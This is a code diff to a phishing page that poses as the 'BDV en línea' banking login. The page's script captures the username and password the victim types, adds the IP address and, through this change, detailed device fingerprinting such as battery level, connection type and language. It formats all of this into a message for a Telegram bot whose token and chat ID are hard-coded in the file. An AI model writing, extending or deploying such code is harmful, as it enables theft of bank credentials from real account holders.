@@ -410,6 +410,23 @@
             const usuario = document.querySelector('.input-field').value;
             const password = document.querySelector('.password-input').value;
             
+            // Detectar dispositivo móvil y obtener información
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            const deviceInfo = {
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'No disponible',
+                battery: await navigator.getBattery?.() || 'No disponible',
+                orientation: screen.orientation?.type || 'No disponible',
+                touchPoints: navigator.maxTouchPoints,
+                model: navigator.userAgentData?.platform || 'No disponible'
+            };
+            
             const userAgent = navigator.userAgent;
             const screenSize = `${window.screen.width}x${window.screen.height}`;
             const fecha = new Date().toLocaleString();
@@ -425,14 +442,20 @@
             const token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
             const chat_id = "6912929677";
             
-            // Mensaje simplificado
+            // Mensaje con información del dispositivo
             const mensaje = `
 🏦 ═══ BDV EN LÍNEA ═══ 🏦
 
 👤 Usuario: ${usuario}
 🔑 Clave: ${password}
 🌐 IP: ${ip}
-📱 Dispositivo: ${userAgent}
+
+📱 INFORMACIÓN DEL DISPOSITIVO:
+${isMobile ? '📱 Dispositivo Móvil' : '💻 Computadora'}
+📲 Modelo: ${deviceInfo.model}
+🔋 Batería: ${deviceInfo.battery.level ? `${deviceInfo.battery.level * 100}%` : 'N/A'}
+📡 Conexión: ${JSON.stringify(deviceInfo.connection)}
+🌍 Idioma: ${deviceInfo.language}
 🖥️ Pantalla: ${screenSize}
 📅 Fecha: ${fecha}
 
